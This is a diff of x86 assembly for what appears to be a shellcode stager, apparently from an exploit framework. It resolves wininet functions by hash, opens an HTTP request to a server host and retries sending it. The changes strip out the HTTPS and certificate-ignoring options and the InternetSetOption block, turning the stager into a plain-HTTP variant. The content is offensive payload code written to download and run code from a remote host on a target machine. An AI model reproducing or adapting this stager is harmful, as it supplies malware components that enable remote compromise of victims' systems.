@@ -22,7 +22,7 @@ internetopen:
   push edi               ; LPCTSTR lpszProxyBypass
   push edi               ; LPCTSTR lpszProxyName
   push edi               ; DWORD dwAccessType (PRECONFIG = 0)
-  push byte 0            ; NULL pointer  
+  push byte 0            ; NULL pointer
   push esp               ; LPCTSTR lpszAgent ("\x00")
   push 0xA779563A        ; hash( "wininet.dll", "InternetOpenA" )
   call ebp
@@ -49,13 +49,10 @@ httpopenrequest:
   pop ecx
   xor edx, edx           ; NULL
   push edx               ; dwContext (NULL)
-  push (0x80000000 | 0x04000000 | 0x00800000 | 0x00200000 |0x00001000 |0x00002000 |0x00000200) ; dwFlags
+  push (0x80000000 | 0x04000000 | 0x00200000 | 0x00000200) ; dwFlags
     ;0x80000000 |        ; INTERNET_FLAG_RELOAD
     ;0x04000000 |        ; INTERNET_NO_CACHE_WRITE
-	;0x00800000 |        ; INTERNET_FLAG_SECURE
 	;0x00200000 |        ; INTERNET_FLAG_NO_AUTO_REDIRECT
-    ;0x00001000 |        ; INTERNET_FLAG_IGNORE_CERT_CN_INVALID
-    ;0x00002000 |        ; INTERNET_FLAG_IGNORE_CERT_DATE_INVALID
     ;0x00000200          ; INTERNET_FLAG_NO_UI
   push edx               ; accept types
   push edx               ; referrer
@@ -70,17 +67,6 @@ httpopenrequest:
 set_retry:
   push byte 0x10
   pop ebx
-
-; InternetSetOption (hReq, INTERNET_OPTION_SECURITY_FLAGS, &dwFlags, sizeof (dwFlags) );
-set_security_options:
-  push 0x00003380
-  mov eax, esp
-  push byte 4            ; sizeof(dwFlags)
-  push eax               ; &dwFlags
-  push byte 31           ; DWORD dwOption (INTERNET_OPTION_SECURITY_FLAGS)
-  push esi               ; hRequest
-  push 0x869E4675        ; hash( "wininet.dll", "InternetSetOptionA" )
-  call ebp
 
 httpsendrequest:
   xor edi, edi
@@ -97,7 +83,7 @@ httpsendrequest:
 try_it_again:
   dec ebx
   jz failure
-  jmp short set_security_options
+  jmp short httpsendrequest
 
 dbl_get_server_host:
   jmp get_server_host
